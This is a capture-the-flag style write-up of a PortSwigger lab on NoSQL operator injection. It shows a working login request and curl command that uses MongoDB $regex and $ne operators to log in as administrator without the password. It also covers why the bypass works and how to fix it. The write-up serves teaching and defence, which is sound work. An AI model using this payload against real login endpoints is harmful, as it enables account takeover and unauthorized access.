---
layout: post
title: "PortSwigger: Exploiting NoSQL Operator Injection to Bypass Authentication"
date: 2027-08-31 09:00:00 -0500
categories: [Web Security, NoSQL Injection]
tags: [portswigger, nosql, mongodb, injection, authentication, web]
---

## Lab Summary

**Lab:** Exploiting NoSQL operator injection to bypass authentication  
**Difficulty:** Apprentice  
**CWE:** CWE-943 – Improper Neutralization of Special Elements in a Data Query Logic  
**Result:** Solved

---

## The Vulnerability

The login page sends your username and password to the server as JSON. The server
drops those two values straight into a MongoDB query that looks for a matching user:

```js
db.users.find({ username: <your username>, password: <your password> });
```

Normally you send strings, and MongoDB compares them for equality. But because the body
is parsed as JSON, you can send an **object** instead of a string — and MongoDB treats
keys that begin with `$` as **query operators**, not as data. That lets you rewrite the
meaning of the query instead of just supplying a value.

This is *operator* (object) injection — distinct from the syntactic JavaScript-string
NoSQL injection where you break out of a `$where`/eval string with a quote.

---

## The Attack

Send the login POST with operator objects in place of the string values:

```http
POST /login HTTP/2
Content-Type: application/json

{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

Response:

```
HTTP/2 302
location: /my-account?id=adminec3qnvod
```

A 302 to the administrator's account means we are logged in as admin — without ever
knowing the password.

A single working curl command:

```bash
curl -s -X POST "https://<lab-id>.web-security-academy.net/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$regex":"admin.*"},"password":{"$ne":""}}' -i | grep -i location
```

---

## Why It Works

- `"password":{"$ne":""}` — `$ne` means *not equal*. "Password is not equal to empty
  string" is true for any real stored password, so the password constraint is satisfied
  **without knowing the password**.
- `"username":{"$regex":"admin.*"}` — `$regex` does pattern matching. `admin.*` matches
  the administrator's username. This is the key upgrade over the simpler
  `{"username":{"$ne":""}}` (which just matches the *first* user in the collection):
  `$regex` lets you **pin the login to a specific account** of your choosing.

So the query effectively became "find a user whose name looks like `admin` and whose
password is anything." MongoDB returned the administrator row, and the app issued a valid
session for it.

The 302 redirect alone is proof the bypass worked — a wrong password re-renders the form
with a `200` and an "Invalid username or password" error.

---

## The Fix

Never let user input change the *structure* of a query:

- Cast both fields to strings before querying and **reject anything that isn't a string** —
  an object whose first key starts with `$` should produce a 400, not a query.
- Validate the request body against a schema (zod/Joi) so only string username/password
  are accepted.
- Verify the password with a dedicated hash-compare step, separate from the lookup,
  instead of folding it into the find filter.

```js
if (typeof req.body.username !== 'string' || typeof req.body.password !== 'string')
  return res.sendStatus(400);
```

---

## Key Takeaway

When a login endpoint accepts JSON and the backend is a document database, the values are
not just data — an object like `{"$ne":""}` or `{"$regex":"admin.*"}` becomes part of the
query logic. `$ne` defeats the password check; `$regex` lets you choose exactly which
account you log in as.
